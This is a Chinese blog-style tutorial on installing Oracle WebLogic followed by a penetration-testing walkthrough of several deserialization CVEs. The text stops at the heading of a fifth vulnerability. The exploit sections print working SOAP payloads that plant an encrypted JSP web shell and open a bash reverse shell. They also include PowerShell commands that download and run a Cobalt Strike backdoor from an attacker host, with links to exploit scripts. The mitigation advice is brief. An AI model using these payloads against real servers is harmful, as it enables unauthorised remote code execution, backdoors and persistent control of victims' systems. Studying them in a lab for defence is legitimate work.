> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6X_JEveVf7R6acxCdD0sDg)

### 一. weblogic 简介

WebLogic 是美国 Oracle 公司出品的一个 application server 确切的说是一个基于 JAVAEE 架构的中间件，BEA WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

WebLogic Server 具有标准和可扩展性的优点，对业内多种标准都可全面支持，包括 EJB、JSP、Servlet、JMS、JDBC、XML（标准通用标记语言的子集）和 WML，使 Web 应用系统的实施更为简单，并且保护了投资，同时也使基于标准的解决方案的开发更加简便，同时 WebLogic Server 以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源 pooling 以及动态网页和 EJB 组件群集。

默认端口：7001

目前较为活跃的版本：

```
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.1
Weblogic 12.2.1.2
Weblogic 12.2.1.3
```

### 二. weblogic 安装

下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

weblogic 最新的版本需要 jdk1.8 以上，如果 jdk1.7 或者以下，可能会安装不了，jdk1.6 的话应该是 10.3.6 及以下。

#### weblogic 10.3.6 安装

这里安装环境为 win7

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDZHHTibn15b1689IvrtMiatmUa8xaIx3tNWrFias4rfggwBShde50DaZjw/640?wx_fmt=png)image-20210809105230816![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDMp3U8jUP9OdzRrMuoCTyHPdRWklEBvQnLbWxtiace3rVP6ugtNYFbibg/640?wx_fmt=png)image-20210809105644198

双击启动安装

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDc4MFjiaxjzVsyInllYexklTDTNickZZSWs1MN5ogyn1zUj3SYfCHiawxQ/640?wx_fmt=png)image-20210809105814087![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDicpPQftURIDpu3jpRxucOjNzC7XTpHQLJxLxYgj2ib6Z53tqa7gicPhCw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNTslydPbNCfcnBFZCjSxG8Pw2ic5UI6Z6e8PQZwpY5aUQSlsRAy2unQ/640?wx_fmt=png)image-20210809110119887![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDW02iaHHm0xC1x9rTN50alr6FzD6P7RtJXunXgF08oa9yWazvwibA3hgA/640?wx_fmt=png)image-20210809110133160![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDA7SGT3JtO8ZUTT6Rn5CC1LF6dTw8j4QXHyl7sfIDBsu9VLw0R4MDCQ/640?wx_fmt=png)image-20210809110203679![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDrsxSdGMkiahReDicdXflPo24ricvicsmlxd2DMHibDplJ1moib0knQKG2ibTA/640?wx_fmt=png)image-20210809110238157![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDeuYPtb3Vlzroficptm9lWPkfs4ynw9xxwAeCYy4Hicxwr0yMZTrHL9rQ/640?wx_fmt=png)image-20210809154158552![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDePNXiaeicVsDmNJVz86nLRTdxcBJLicp33lXiaXMn4L1LUJic7zib1bzJVRA/640?wx_fmt=png)image-20210809154229316![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDdxn3p5zxhO8yiaSdHvLHQxpWTbbEiacmNLXXH9SzBLB5cdmibtNKsvbUA/640?wx_fmt=png)image-20210809110431311![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDCNcqBvtsILnRBrS9Fcib6xxA6Ql9sdCC3aRMIUVOxfhwzr7QTvMLib2w/640?wx_fmt=png)

安装完成后自动出现快速启动页面

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDuk8VkIEAQ4yMIEQEXCf6lOibroycxWic5wLAeicVuD6fnFjMQX4UUn0OA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDKaHSYJz4iaiboiaCSQXLQWiaY7hvo0iciahiaG1GTic3VKeRL1icHic0bsp5bUeA/640?wx_fmt=png)image-20210809111057748![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD2aiadLsu9zSUaQMHfJk60tmXPW8vMJ5Y6dlHZkjdBoNiaDmUqwgaNOYA/640?wx_fmt=png)

这里默认即可

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBUMr5b3BSnrDslGjJX6MboOONYIylGiaNWF96GGzhiaEE5WbV0Nn838A/640?wx_fmt=png)image-20210809111349116

这里我的是 zcc12345

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDR9Yg2j4Jdv46SHhPDMc4yYOPUXib0HAPTnb4N4SDM3uSibtjlM0TZeQA/640?wx_fmt=png)

开发模式：该模式启用自动部署；生产模式：该模式关闭自动部署 (MyEcipse 版本不支持产品模式)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDBQwtXeE9JknVmVGicMvmVOh5cETUW3XrtTZfIPmta0Hn6U4vlpP5icyA/640?wx_fmt=png)image-20210809134240451![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNSnibpVnK24MP4FQjHmJLs6cibQYSdfutC9xjr8WicX8qiaIGzFVh4eibrg/640?wx_fmt=png)image-20210809134317197![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDK1EOIV5Pu593vUXYC4TgM8j1ms2pARdOGuoxw6CeXuAhn2shaD6KoA/640?wx_fmt=png)image-20210809134433087

一直默认下一步之后点击创建

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDrxrNs6VL534Vjw633wbXPamicae4rDbzHIWxdMvxQI59lDJibmFddpFA/640?wx_fmt=png)image-20210809134616650![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD717ppjJhIuvqteVwSykOSN6pSwRiawyu1JCl2kb2MoV5NR5w4jEXYqQ/640?wx_fmt=png)image-20210809134650091

#### weblogic 10.3.6 配置

进入该目录下，双击红框中的 startWebLogic.cmd，启动 weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDHSd0iceoMRgx3icrAQ4cA6jzMsNwZVAzYHI71Up3z1NQLzUn5u0yGuQQ/640?wx_fmt=png)image-20210809134918621

输入刚刚设置的 weblogic 用户名和密码

```
weblogic
zcc12345
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDpgOHkCXiaiaBp1MiahyqUMYXQSW7rGbs7v6Hd2zFCnzqWMJRLJRjBERkA/640?wx_fmt=png)image-20210809135306951

打开浏览器输入控制台 url，进入控制台进行管理

```
http://192.168.10.154:7001/console/
```

image-20210809135607222![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDTD8GnLDHicEOQo4tdPL2oA34HvcEpvwfKIxtibNLb1hQYgrRnKvXXOfA/640?wx_fmt=png)

用户名密码还是上面设置的 weblogic/zcc12345

#### weblogic 12.1.3 安装

12 版本的安装需要在 jdk7 的环境下，这里我已经安装完成

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDImWCJTASCH3Q9Axt6hLBn9iaIQHxDmDfN8o6t6IbEzTTXbEwGgibdjNw/640?wx_fmt=png)image-20210814161036126![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDIkoomrx2ll718wMrz1R6icqbFxu4BuIRl2exXfdux96pUv58qToo5iaQ/640?wx_fmt=png)image-20210814162020929

官网下载安装包，官网链接：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD30lvMxhYe7Ut6VPvODcQbwEPRVaqcKbZYkKQwoqhj6QiaiaMhJmxKrRg/640?wx_fmt=png)image-20210814160458436

将下载好的安装包放入 jdk 的 bin 目录下，防止因环境变量带空格导致的错误，过程一直默认下一步即可

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDP3Rqvhm7Zv6YW1AiaAxKIvoCCKXPAfsE1kYBcfRNAhyOzU42C8o0dYg/640?wx_fmt=png)image-20210814162427162

这里一定要以管理员身份运行，不然提取文件会失败

```
java -jar fmw_12.1.3.0.0_wls.jar
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDfaGDxqmwA4k7ib3XibhBX6MQHR006S0OOzSDpMhKN222tVzkKJ2PEPXw/640?wx_fmt=png)image-20210814163432029![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNyT5gGcibFibzRTnwk6W2WOHiaJibY9DKk2M5kudYdBOnDwz59Rsau4ldA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDSjXxpxiaPaM5eUNbnpWZs89TYSzIBktpfqC2ulAkSmmG0CRAwTFEfOQ/640?wx_fmt=png)image-20210814165250515![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDcJ4vHKQdYtW4ut2IUauJAgjxXI8TLkDz9jSzOg7zeTW5g9xSI0A5iaA/640?wx_fmt=png)image-20210814165616715

接下来安装域

在电脑上找到 Configuration Wizard，双击运行

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDkKh33O0bFb6MWANUCQNpNkE3Xk6ZnYZ5PftUh1JD3SxVrtSo5BiaQsg/640?wx_fmt=png)image-20210814165704899

选择下一步 -> 下一步

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDu1fdgjQHuwm2cVYuTd65g0SxC5Dibic5wX7XnNNGwltCZK2Nn9NF1SOQ/640?wx_fmt=png)image-20210814165802594

输入口令，这里用户名默认，口令设置的是 zcc12345

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDHnCVHMXrl7yN4nwmSIpMMN9icgsjdS9ibEIrHia0O1gV4WtibQCK6tlVXA/640?wx_fmt=png)image-20210814165857818

下一步

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDv7UHLJF2dHt2R2aIf0mognr2A2pC1IsaUvZNKMt2pmm1ibqyPVu9NjQ/640?wx_fmt=png)image-20210814165945030![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDzXrTbhztyL76d1iauzoaH7HfSEBynIp0RcARXsJ1Artwkgxkgb5wg5Q/640?wx_fmt=png)image-20210814165958254

选本机 IP

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDH4TEljw705EQCwDteyQlnPoqfyJFxBVLNuesr63r6S9D10xdWGibv3A/640?wx_fmt=png)image-20210814170040154![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDlqu0yGZliaIib8TOJ52NZHNmiaO8LkN0W87vJkqVbMV2aA7vYEZpAfFcA/640?wx_fmt=png)image-20210814170128516![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDQVV0dhJIkbduiawVY4VtJrT4xFolwSlgtyB6VT4w1VWcOmB0p7IQ7tQ/640?wx_fmt=png)image-20210814170217064![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDkovy4phNXtQC3o15Ss60hBMcAvwSaOzsCn9fdYBOOVUaN3A6EakyicA/640?wx_fmt=png)image-20210814170242532![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNRDwApwvus7q8ID5muP5l9k5iaLhv1X4NecFKtWrWiagoF9Ub9UCyQnQ/640?wx_fmt=png)image-20210814170306146

#### weblogic 12.1.3 配置

进入该目录下启动，这里不再需要输入账号密码

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDMMRwkTRke7O3DL0oxEVzCliaSjXAEwRIFiabR2MjYXP8YZib3JJ2xTTYg/640?wx_fmt=png)image-20210814170531939![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDicEB05I00t7ZSJj6DicnuLsvplbtQ7JXlMmXC7Qh3v5BtI9pQ7PVnvAQ/640?wx_fmt=png)

成功搭建，可正常访问。

### 三. weblogic 渗透总结

#### 1.XMLDecoder 反序列化漏洞 CVE-2017-10271

##### 漏洞简介

Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。

##### 影响版本

```
10.3.6.0
12.1.3.0.0
12.2.1.1.0
```

##### 验证漏洞

当访问该路径 /wls-wsat/CoordinatorPortType （POST），出现如下图所示的回显时，只要是在 wls-wsat 包中的皆受到影响，可以查看 web.xml 查看所有受影响的 url，说明存在该漏洞；

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD8QesK5g9mIbpwWRZbRJXRn7vYBXVDqN0GORCsPom738lzMNtgI3YbA/640?wx_fmt=png)image-20210809140942304

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF
```

进行该路径查看 web.xml;

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDmGEzVuEJeMU7XqvibY02QB49JRgibolmUESoSC8se6xTQGA1RoWtM9ZA/640?wx_fmt=png)image-20210809141314849![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDuL0N5pRvToqTuMSWnKezX6hBfxjfOh3r83foL4VNYdkTrwp5WeDuHw/640?wx_fmt=png)image-20210809141512699

总结下来就是下面这些 url 会受到影响；

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

##### 漏洞复现

抓包，修改内容

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java><java version="1.4.0" class="java.beans.XMLDecoder"> <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc.jsp</string> <void method="println"><string> <![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> ]]> </string> </void> <void method="close"/> </object></java></java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDwI4AxXic9D8cMwpxYcvBOs7D2CtH6jdhvkibT2CYurInRhn3Iic5XZdhw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDpyKFGNodbAqNNJ8RTA8bSnyic0W3sk6lJgQqfbaaDNQvQFmbHlFiar6Q/640?wx_fmt=png)image-20210809162737924![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDdOZbFsjNjMBVKphxucSuXbia1wnXWpy8JaaUG49ByVQeZ1esIm7U6oQ/640?wx_fmt=png)image-20210809162717485

实现 Linux 反弹 shell 的 poc：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: x.x.x.x:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/x.x.x.x/4444 0>&1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
```

实现 win 上线 cs

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.10.154:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 704<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string> </void> <void index="1"> <string>-Command</string> </void> <void index="2"> <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
```

cs 生成后门木马

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXoaOiaMmKicibrkvZ6Kmuv05duyQ19ZL7YibdRz5ZxIhPJSGNIDic2RCOwg/640?wx_fmt=png)image-20210810105923024

放在 kali 上，开启简易的 http 服务

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDzq3VDYzSbjrAapG8t1BicEwGhiateibKJ9GibvJhByv1GDEyypevkYlAVA/640?wx_fmt=png)image-20210810110037377

powershell 上线 cs：

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDXgmEY6ibwtF9vADpRvrbV2vicMP7JpMjibPhNzyIyD06kYlBbdXiahrdOQ/640?wx_fmt=png)image-20210810111100065![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDbl4jEEpXDiakDrjVOPah0GgAz0JmJut3ia1mU9WFbIiaeTtvtA7I5ARjg/640?wx_fmt=png)image-20210810110916447

成功上线 cs

##### 安全防护

前往 Oracle 官网下载 10 月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

#### 2.XMLDecoder 反序列化漏洞 CVE-2017-3506

##### 漏洞简介

cve-2017-10271 与 3506 他们的漏洞原理是一样的, 只不过 10271 绕过了 3506 的补丁，CVE-2017-3506 的补丁加了验证函数，验证 Payload 中的节点是否存在 object Tag。

```
private void validate(InputStream is){ WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser =factory.newSAXParser(); parser.parse(is, newDefaultHandler() { public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException { if(qName.equalsIgnoreCase("object")) { throw new IllegalStateException("Invalid context type: object"); } } }); } catch(ParserConfigurationException var5) { throw new IllegalStateException("Parser Exception", var5); } catch (SAXExceptionvar6) { throw new IllegalStateException("Parser Exception", var6); } catch (IOExceptionvar7) { throw new IllegalStateException("Parser Exception", var7); } }
```

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.0
12.2.1.1 
12.2.1.2
```

##### 漏洞复现

利用的 poc:

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> <java> <object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zcc3.jsp</string> <void method="println"> <string> <![CDATA[ <% out.print("zcc1 hello"); %> ]]> </string> </void> <void method="close"/> </object> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/></soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDTdicqp7EiaHkAVvwn461v7jHHptSqRicD4hD18xhJQEDW62OAfwKqmXDw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDO75dmGx0ZaKkHE0McKiabZQe27AibWA6axdCT3pLohjSeTz88icn95WqQ/640?wx_fmt=png)image-20210810141515224

##### 安全防护

前往 Oracle 官网下载 10 月份所提供的安全补丁：

http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html

#### 3.wls-wsat 反序列化远程代码执行漏洞 CVE-2019-2725

##### 漏洞简介

此漏洞实际上是 CVE-2017-10271 的又一入口，CVE-2017-3506 的补丁过滤了 object；CVE-2017-10271 的补丁过滤了 new，method 标签，且 void 后面只能跟 index，array 后面只能跟 byte 类型的 class；CVE-2019-2725 的补丁过滤了 class，限制了 array 标签中的 byte 长度。

##### 影响组件

```
bea_wls9_async_response.war
wsat.war
```

##### 影响版本

```
10.3.*
12.1.3
```

##### 验证漏洞

访问  /_async/AsyncResponseService，返回 200 则存在，404 则不存在

查看 web.xml 得知受影响的 url 如下：

访问路径为：

```
C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDf6kW87Kmk5U18X6QJ2ibdOiaydfGtiaM9sEQ16tkHA9k9IIDKnsR5micCA/640?wx_fmt=png)image-20210810143210331

```
/_async/AsyncResponseService
/_async/AsyncResponseServiceJms
/_async/AsyncResponseServiceHttps
/_async/AsyncResponseServiceSoap12
/_async/AsyncResponseServiceSoap12Jms
/_async/AsyncResponseServiceSoap12Https
```

##### 漏洞复现

访问该 url，回显如下，说明存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDJXvicCYoqko7NEtRhPXBjXELX6TSiaWS0SqItxpLX0RVicVaS1d1jAEkA/640?wx_fmt=png)image-20210810142738800

win 上线 cs 的 poc 如下，这里 exe 用的是上面生成的：

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string></void><void index="1"><string>-Command</string></void><void index="2"><string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc1.exe','zcc1.exe');start-process zcc1.exe</string></void></array><void method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDbfibFLS0SXoklrQa8pYRMGy2Pvot1iaqoQbfk37Yph6ciaUsxhSPVrDyA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDp4vibpGakL4128UGr1W87TamzVvgwg1yj0uSqN3XVANZ2MiaBuCM4CcQ/640?wx_fmt=png)

##### 安全防护

1、升级本地 JDK 环境

2、及时安装官方补丁

#### 4.WebLogic T3 协议反序列化命令执行漏洞 CVE-2018-2628

##### 漏洞简介

远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过 T3 协议（EJB 支持远程访问，且支持多种协议。这是 Web Container 和 EJB Container 的主要区别）在 Weblogic Server 中执行反序列化操作，利用 RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java Remote Messaging Protocol：java 远程消息交换协议）达到执行任意反序列化 payload 的目的。

##### 影响版本

```
10.3.6.0
12.1.3.0
12.2.1.1
12.2.1.2
```

##### 相关漏洞

```
CVE-2015-4852
CVE-2016-0638
CVE-2016-3510
CVE-2017-3248
CVE-2018-2893
CVE-2016-0638
```

##### 验证漏洞

使用脚本跑，脚本运行需 python2 环境，出现如下图所示的回显时，说明存在该漏洞；

脚本链接：https://github.com/shengqi158/CVE-2018-2628

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD4jfDyK43zadxG2ibxNEXKhMZ9TVSbLoUjXGAbrE2nV72w2tTnhKNtow/640?wx_fmt=png)image-20210810160702675![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDNoeslY52StrmlYg2tChDQwibmRGJjHyrOPC8qUdTe2vlZKNATI1EA3g/640?wx_fmt=png)image-20210810160718697

##### 漏洞复现

windows-getshell，使用 k8weblogicGUI.exe

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDAqYzKvB4HSmpf39zJP4Towic5rB7yG7ZOQicxybISZoBicVichO15C0uzg/640?wx_fmt=png)image-20210810163031055

这里出了点问题，文件名改成了 1.jsp

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDiciavwbyjO7kG1TcBK2KysoEQISx7WJ65Emiap6EkUib8g82QVtUtq4Xdg/640?wx_fmt=png)image-20210810164738168

用脚本连接得到交互 shell, 脚本运行需 python2 环境

脚本链接：https://github.com/jas502n/CVE-2018-2628

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaD1qYj2CohichL677uT3ftcUrgtqJkDfVZCtOb9eicOdafzJ3ARIibPSfog/640?wx_fmt=png)image-20210810165228766

在此处上线 cs，用的依旧是上面的马，改名 zcc3.exe

```
powershell -Command (new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc3.exe','zcc3.exe');start-process zcc3.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDgN5S8MIQUqXk0K7k7h0foHH5MD2zZC4kOyeibrRFztLDoiaJJr5cwdfg/640?wx_fmt=png)image-20210810170001387![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDUSbKKQ5mic1wWqURvgw7yOWjhYNrIh2yevNiaT1zOqia3gEiaibHBmDlgpA/640?wx_fmt=png)image-20210810170039655

##### 安全防护

过滤 t3 协议，再域结构中点击 安全 -> 筛选器，选择筛选器填：

```
weblogic.security.net.ConnectionFilterImpl
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpA3ibWLjQRRncc1kLkIypiaDCMFbHG1JLg33CfGl3tddCm4FTaIfOGibNzDh2sdmiaCCnuSHjVjIiawXA/640?wx_fmt=png)image-20210813140332501

保存后重启 weblogic 即可。

#### 5.WebLogic 未授权访问漏洞（CVE-2018-2894）

##### 漏洞简介

